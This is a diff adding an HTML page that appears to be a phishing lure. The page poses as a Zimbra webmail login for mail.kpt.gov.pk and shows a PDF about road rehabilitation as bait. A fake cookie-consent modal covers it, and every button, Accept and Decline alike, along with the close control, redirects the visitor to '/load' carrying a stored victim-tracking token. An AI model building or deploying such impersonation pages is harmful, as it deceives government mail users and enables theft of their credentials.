@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <link rel="SHORTCUT ICON" href="/favicon.ico">
+  <title>Zimbra Email Authentication</title>
+  <style>
+    html, body {
+      height: 100%;
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #000; /* fallback background */
+    }
+
+    .overlay {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw; height: 100vh;
+      background: rgba(0, 0, 0, 0.3);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 999;
+    }
+
+    .modal {
+      position: relative;
+      background: white;
+      border-radius: 8px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.5);
+      width: 450px;
+      padding: 20px;
+      animation: fadeIn 0.5s ease;
+      transform: translateX(150px); 
+    }
+
+    .modal h4 {
+      margin: 0;
+      font-size: 16px;
+    }
+
+    .modal p {
+      font-size: 14px;
+      margin: 16px 0;
+    }
+
+    .buttons {
+      text-align: right;
+    }
+
+    .btn {
+      background: #eee;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      padding: 6px 12px;
+      margin-left: 10px;
+      font-size: 14px;
+      cursor: pointer;
+      text-decoration: none;
+      color: #333;
+    }
+
+    .btn.blue {
+      background-color: #007bff;
+      color: white;
+      border: none;
+    }
+
+    .btn:hover {
+      opacity: 0.9;
+    }
+
+    .close-button {
+      position: absolute;
+      top: 10px;
+      right: 15px;
+      font-size: 20px;
+      font-weight: bold;
+      color: #999;
+      cursor: pointer;
+    }
+
+    .close-button:hover {
+      color: #000;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateX(150px) scale(0.9); }
+      to { opacity: 1; transform: translateX(150px) scale(1); }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- ✅ PDF as background -->
+  <embed src="/REHABILITATION OF ROAD AT M.I YARD WEST WHARF.pdf" type="application/pdf"
+         width="100%" height="100%"
+         style="position: fixed; top: 0; left: 0; z-index: 0;">
+
+  <!-- Modal Overlay -->
+  <div class="overlay" id="popup">
+    <div class="modal">
+      <span class="close-button" onclick="closeModal()">&times;</span>
+      <h4>mail.kpt.gov.pk</h4>
+      <p>
+        This website uses cookies to help you have a superior 
+        and more admissible browsing experience on the website.
+      </p>
+      <div class="buttons">
+        <a href="#" class="btn" id="declineBtn">Decline</a>
+        <a href="#" class="btn blue" id="acceptBtn">Accept</a>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // Extract 'gdgdsdh' from URL and store in localStorage
+    const urlParams = new URLSearchParams(window.location.search);
+    const gdgdsdh = urlParams.get('gdgdsdh');
+
+    if (gdgdsdh) {
+      localStorage.setItem('gdgdsdh_value', gdgdsdh);
+    }
+
+    function closeModal() {
+      const storedgdgdsdh = localStorage.getItem('gdgdsdh_value');
+      if (storedgdgdsdh) {
+        window.location.href = `/load?gdgdsdh=${encodeURIComponent(storedgdgdsdh)}`;
+      } else {
+        window.location.href = '/load';
+      }
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+      const storedgdgdsdh = localStorage.getItem('gdgdsdh_value');
+
+      const declineBtn = document.getElementById('declineBtn');
+      const acceptBtn = document.getElementById('acceptBtn');
+
+      if (declineBtn && storedgdgdsdh) {
+        declineBtn.addEventListener('click', (e) => {
+          e.preventDefault();
+          window.location.href = `/load?gdgdsdh=${encodeURIComponent(storedgdgdsdh)}`;
+        });
+      }
+
+      if (acceptBtn && storedgdgdsdh) {
+        acceptBtn.addEventListener('click', (e) => {
+          e.preventDefault();
+          window.location.href = `/load?gdgdsdh=${encodeURIComponent(storedgdgdsdh)}`;
+        });
+      }
+    });
+  </script>
+
+</body>
+</html>
